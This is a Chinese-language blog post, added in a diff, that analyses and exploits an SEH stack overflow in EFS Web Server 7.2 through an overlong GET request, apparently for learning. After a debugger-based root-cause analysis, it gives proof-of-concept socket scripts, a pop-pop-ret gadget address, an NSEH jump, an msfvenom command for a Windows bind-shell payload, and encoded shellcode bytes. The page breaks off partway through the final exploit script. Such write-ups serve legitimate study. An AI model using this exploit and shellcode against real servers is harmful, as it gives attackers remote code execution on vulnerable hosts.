@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="一、漏洞描述 漏洞软件：EFS Web Server 7.2 GET请求远程代码执行漏洞(SEH)  漏洞链接：https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;42261  软件下载：https:&#x2F;&#x2F;www.exploit-db.com&#x2F;apps&#x2F;60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe  利用简述：利用SEH劫持程序执行流">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EFS Web Server 7.2远程代码执行漏洞分析">
+<meta property="og:url" content="http://example.com/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、漏洞描述 漏洞软件：EFS Web Server 7.2 GET请求远程代码执行漏洞(SEH)  漏洞链接：https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;42261  软件下载：https:&#x2F;&#x2F;www.exploit-db.com&#x2F;apps&#x2F;60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe  利用简述：利用SEH劫持程序执行流">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/04/19/JyqaeKvX9k6hmbs.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/19/m6G3tofeQiqwzbn.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/gNoY7fJc2C4XLZj.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/YlqARutXOypBfiP.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/kOTh8slbFdCZBXA.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/U7djOvkDQw9rWFK.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/FltwCgi5hesGTE8.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/LipWCG5yzBPUr8H.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/Elf3hSypePxm8z6.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/RB2IUTpVhlyXCOE.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/CUBYHcuTmF9MI5h.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/qVd63TEQFrcCuxs.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/8klcI1Dgdj7uWpL.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/byLxYRmUvpqNZ5u.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/ujHAYo7R2JDXVrE.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/mpT1Qg76MAuxner.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/XcUEz28SNC7Zj9u.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/tLCRUo9Gapvq1KT.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/AIrY4E6P238jUcW.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/Fce9VMjwEamdstR.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/gfM461oIazUPWHn.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/LqDuQaEo5G1YBPr.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/20/ziNX3VkbFBd1QG8.png">
+<meta property="article:published_time" content="2021-04-19T16:17:05.000Z">
+<meta property="article:modified_time" content="2021-04-19T16:27:16.210Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="远程代码执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/19/JyqaeKvX9k6hmbs.png">
+
+<link rel="canonical" href="http://example.com/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>EFS Web Server 7.2远程代码执行漏洞分析 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EFS Web Server 7.2远程代码执行漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-20 00:17:05 / 修改时间：00:27:16" itemprop="dateCreated datePublished" datetime="2021-04-20T00:17:05+08:00">2021-04-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">二进制安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><ul>
+<li><p>漏洞软件：EFS Web Server 7.2 GET请求远程代码执行漏洞(SEH)</p>
+</li>
+<li><p>漏洞链接：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42261">https://www.exploit-db.com/exploits/42261</a></p>
+</li>
+<li><p>软件下载：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe">https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe</a></p>
+</li>
+<li><p>利用简述：利用SEH劫持程序执行流到shellcode，难度不大，适合学习windows的SEH漏洞利用</p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
+<li>靶机环境：Windows xp sp3<ul>
+<li>EFS Web Server 7.2</li>
+<li>windbg</li>
+<li>mona</li>
+</ul>
+</li>
+<li>攻击机环境：kali<ul>
+<li>pwntools</li>
+<li>metasploit</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-漏洞复现与分析"><a href="#2-漏洞复现与分析" class="headerlink" title="2. 漏洞复现与分析"></a>2. 漏洞复现与分析</h3><p>编写poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">20000</span>, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用windbg附加漏洞程序，发送poc，触发漏洞</p>
+<img src="https://i.loli.net/2021/04/19/JyqaeKvX9k6hmbs.png" alt="image-20210418153647636" style="zoom:80%;" />
+
+<p>查看eax，eax+4c不可读，导致异常</p>
+<img src="https://i.loli.net/2021/04/19/m6G3tofeQiqwzbn.png" style="zoom:80%;" />
+
+<p>继续运行，eip指向了0x41414141，同时发现ecx也指向了0x41414141</p>
+<img src="https://i.loli.net/2021/04/20/gNoY7fJc2C4XLZj.png" alt="image-20210418153917690" style="zoom:80%;" />
+
+<p>查看栈</p>
+<img src="https://i.loli.net/2021/04/20/YlqARutXOypBfiP.png" alt="image-20210418154119141" style="zoom:80%;" />
+
+<p>栈回溯，分别跟踪查看61c277f6，61c6286c，004968EF</p>
+<p>用IDA打开sqlite3.dll，查看61c277f6，此处由于访问 eax+4cH 错误，导致异常，重点关注eax即a1，函数传参为a1且没有改变a1的值，所以应回溯上一个函数分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:61C277F6 81 78 4C 97 A6 29+cmp     dword ptr [eax+4Ch], 0A029A697h</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/kOTh8slbFdCZBXA.png" alt="image-20210418223736206" style="zoom:80%;" />
+
+<p>查看61c6286c后发现应当继续回溯，直到004968EF：因为调用sqlite3_prepare_v2()导致异常，继续回溯查看参数是什么，但是发现windbg上一层函数已被覆盖，应重新调试，在4968D0下断点</p>
+<img src="https://i.loli.net/2021/04/20/U7djOvkDQw9rWFK.png" alt="image-20210418224708060" style="zoom:80%;" />
+
+<p>在4968D0断下，逐步运行到004968ef，查看参数，第一个参数this指针为41414141，已经出现异常，需要继续回溯</p>
+<img src="https://i.loli.net/2021/04/20/FltwCgi5hesGTE8.png" alt="image-20210418231850935" style="zoom:80%;" />
+
+<p>但栈帧已被畸形数据覆盖，无法查看上一级函数，但是可以查看栈中保存的参数</p>
+<img src="https://i.loli.net/2021/04/20/LipWCG5yzBPUr8H.png" alt="image-20210419001344360" style="zoom: 80%;" />
+
+<p>关键字符串 select * from sqltable where name = ‘’sql语句，查找程序中调用这个字符串的函数</p>
+<img src="https://i.loli.net/2021/04/20/Elf3hSypePxm8z6.png" alt="image-20210419001805712" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/04/20/RB2IUTpVhlyXCOE.png" alt="image-20210419001857984" style="zoom:80%;" />
+
+<p>有两处调用目标字符串00497584、00497748，经排查后确定00497748地址为可疑函数</p>
+<img src="https://i.loli.net/2021/04/20/CUBYHcuTmF9MI5h.png" alt="image-20210419002434425" style="zoom:80%;" />
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;v15, aSelectFromSWhe, Sqltable, v11, a3);</span><br><span class="line">(<span class="keyword">int</span> __thiscall) <span class="built_in">sub_4968D0</span>(v4, (<span class="keyword">int</span>)&amp;v12, (<span class="keyword">int</span>)&amp;v15);</span><br></pre></td></tr></table></figure>
+
+<p>sprintf 函数将格式化后的sql语句存放进栈上的地址v15即01ba5fd4，其中SQL语句保存畸形字符串a3的内容</p>
+<p>在windbg中查看sub_4968D0的参数，thiscall调用约定中this保存在ecx</p>
+<p>v4 = ecx，&amp;v12 = esp，&amp;v15 = esp+4，此时ecx即01ba7058的地址为畸形字符串，这是由于v15保存的内容覆盖而致</p>
+<img src="https://i.loli.net/2021/04/20/qVd63TEQFrcCuxs.png" alt="image-20210419004214855" style="zoom: 80%;" />
+
+<img src="https://i.loli.net/2021/04/20/8klcI1Dgdj7uWpL.png" alt="image-20210419004016087" style="zoom:80%;" />
+
+<p>查看sub_4968D0中sqlite3_prepare_v2函数的参数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sqlite3_prepare_v2</span><span class="params">(*<span class="keyword">this</span>, a3, <span class="number">-1</span>, (<span class="keyword">int</span>)&amp;a3, <span class="number">0</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/byLxYRmUvpqNZ5u.png" alt="image-20210419004746863" style="zoom:80%;" />
+
+<p>可以看到第一个参数为畸形字符串，在调用sqlite3_prepare_v2函数之前在004968ec将ecx内的值传递给第一个参数，ecx是sub_4968D0传递给sqlite3_prepare_v2的，值为01ba7058</p>
+<img src="https://i.loli.net/2021/04/20/ujHAYo7R2JDXVrE.png" alt="image-20210419005135224" style="zoom:80%;" />
+
+<p>继续执行直到触发漏洞，可以得知ecx指向的地址01ba7058保存的是关键内容，前面分析得知程序在00497748处调用sprintf函数将畸形字符串赋值给了v15指向的01ba5fd4一直覆盖到了01ba7058，覆盖了ecx原本关键指针的内容，导致漏洞</p>
+<p>漏洞原因总结：在sql语句赋值，由于没有对参数进行有效的检查，导致ecx指针对应的内容被sql语句中畸形变量覆盖，后续对ecx指针内容访问时出现了访问地址异常，进入SEH异常处理流程，导致代码执行</p>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>SEH即Windows结构化异常处理程序，用于处理程序发生的错误或异常，SEH结构存放在栈中，多个 SEH 通过链表指针在栈内由栈顶向栈底串成单向链表，发生异常时，程序顺着最近的SEH链表依次尝试其他异常处理函数，这里引用《0day安全》中的图</p>
+<img src="https://i.loli.net/2021/04/20/mpT1Qg76MAuxner.png" alt="image-20210419231727911" style="zoom:80%;" />
+
+<p>当程序执行异常处理函数时，函数创建自己的栈帧，会把next SEH的地址压入栈中，正好时esp+8的位置，那么我们劫持程序执行流方法为把异常处理函数改为pop_pop_ret的gadget，执行之后会跳转到next_seh处执行，将next_seh的值改为跳转到shellcode的代码，即可实现程序处理异常时执行shellcode的目的。这种攻击方法能够绕过SafeSEH。有关SEH攻击的内容可参考《0day安全》的第6.1和11章</p>
+<img src="https://i.loli.net/2021/04/20/XcUEz28SNC7Zj9u.png" alt="image-20210419234650285" style="zoom:80%;" />
+
+<h3 id="2-利用流程"><a href="#2-利用流程" class="headerlink" title="2. 利用流程"></a>2. 利用流程</h3><p>exploit整体思路：程序触发异常后跳转到handler后执行pop_pop_ret，跳转到NSEH执行jmp2shellcode，进而执行shelldcode</p>
+<img src="https://i.loli.net/2021/04/20/tLCRUo9Gapvq1KT.png" alt="image-20210419234820696" style="zoom:80%;" />
+
+<p>写exploit步骤</p>
+<p>发送最初的poc，查看seh链，确定seh的位置4061</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!exchain</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/AIrY4E6P238jUcW.png" alt="image-20210419163918885" style="zoom:80%;" />
+
+<p>使用mona插件在内存中寻找用于攻击seh的gadget，pop_pop_ret</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!py mona seh</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/Fce9VMjwEamdstR.png" alt="image-20210419123938830" style="zoom:80%;" />
+
+<p>选择一个可执行的地址0x100103fe，编写exploit的雏形</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line">nseh = <span class="string">&quot;NSEH&quot;</span></span><br><span class="line">pop_pop_ret = <span class="number">0x100103fe</span></span><br><span class="line">shellcode = <span class="string">&#x27;B&#x27;</span>*<span class="number">8000</span></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, cyclic(<span class="number">4061</span>), nseh, pop_pop_ret, shellcode, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>) </span><br></pre></td></tr></table></figure>
+
+<p>发送exploit可以看到seh链的nseh指针指向了”NESH”，seh handler指向了0x100103fe</p>
+<img src="https://i.loli.net/2021/04/20/gfM461oIazUPWHn.png" alt="image-20210419124137558" style="zoom:80%;" />
+
+<p>在0x100103fe处设置断点，使进程运行到断点处，会执行pop esi，pop edi，ret三条语句，返回到01bafd4即NESH</p>
+<img src="https://i.loli.net/2021/04/20/LqDuQaEo5G1YBPr.png" alt="image-20210419124316451" style="zoom:80%;" />
+
+<p>使NSEH跳转到shellcode，jmp 0x12 = \xeb\x12</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nesh = <span class="string">&quot;\xeb\x12\x90\x90&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>排除坏字符：”\x20\x2b\x2f\x5c” 分别为 “ +/\”，可能这些字符在创建sql语句时进行了特殊处理</p>
+<p>生成shellcode</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp LPORT=4444 -b &#x27;\x00\x20\x2b\x2f\x5c&#x27;  -n 0x20 -f py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_bind_tcp LPORT=4444 -b &#x27;\x00\x20\x2b\x2f\x5c&#x27; -n 0x20 -f py</span></span><br><span class="line">buf =  <span class="string">b&quot;\x90&quot;</span>*<span class="number">0xc</span></span><br><span class="line">buf += <span class="string">b&quot;\xf9\x92\x4a\xf9\x41\xfc\x9b\x9b\x92\x4a\x48\xf9\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x90\x4a\x37\x41\x37\x98\x91\x49\x41\x4b\x91\x93&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf5\xfd\x43\x48\x90\x27\xda\xc1\xbd\xa1\x9e\x47\x62&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\x83\xc2\x04\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x13\x03\xcb\x8d\xa5\x97\xf7\x5a\xab\x58\x07\x9b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xcc\xd1\xe2\xaa\xcc\x86\x67\x9c\xfc\xcd\x25\x11\x76&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x83\xdd\xa2\xfa\x0c\xd2\x03\xb0\x6a\xdd\x94\xe9\x4f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\x17\xf0\x83\x5e\x26\x3b\xd6\x9f\x6f\x26\x1b\xcd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x38\x2c\x8e\xe1\x4d\x78\x13\x8a\x1e\x6c\x13\x6f\xd6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8f\x32\x3e\x6c\xd6\x94\xc1\xa1\x62\x9d\xd9\xa6\x4f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x57\x52\x1c\x3b\x66\xb2\x6c\xc4\xc5\xfb\x40\x37\x17&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x3c\x66\xa8\x62\x34\x94\x55\x75\x83\xe6\x81\xf0\x17&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x40\x41\xa2\xf3\x70\x86\x35\x70\x7e\x63\x31\xde\x63&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x72\x96\x55\x9f\xff\x19\xb9\x29\xbb\x3d\x1d\x71\x1f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5f\x04\xdf\xce\x60\x56\x80\xaf\xc4\x1d\x2d\xbb\x74&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\x3a\x08\xb5\x7e\xba\x06\xce\x0d\x88\x89\x64\x99&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa0\x42\xa3\x5e\xc6\x78\x13\xf0\x39\x83\x64\xd9\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd7\x34\x71\xd7\x57\xdf\x81\xd8\x8d\x4a\x89\x7f\x7e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x69\x74\x3f\x2e\x2d\xd6\xa8\x24\xa2\x09\xc8\x46\x68&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\x61\xbb\x93\x5d\x2e\x32\x75\x37\xde\x12\x2d\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x1c\x41\xe6\x48\x5e\xa3\x5e\xfe\x17\xa5\x59\x01\xa8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe3\xcd\x95\x23\xe0\xc9\x84\x33\x2d\x7a\xd1\xa4\xbb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xeb\x90\x55\xbb\x21\x42\xf5\x2e\xae\x92\x70\x53\x79&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc5\xd5\xa5\x70\x83\xcb\x9c\x2a\xb1\x11\x78\x14\x71&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xce\xb9\x9b\x78\x83\x86\xbf\x6a\x5d\x06\x84\xde\x31&quot;</span></span><br><span class="line">buf += <span 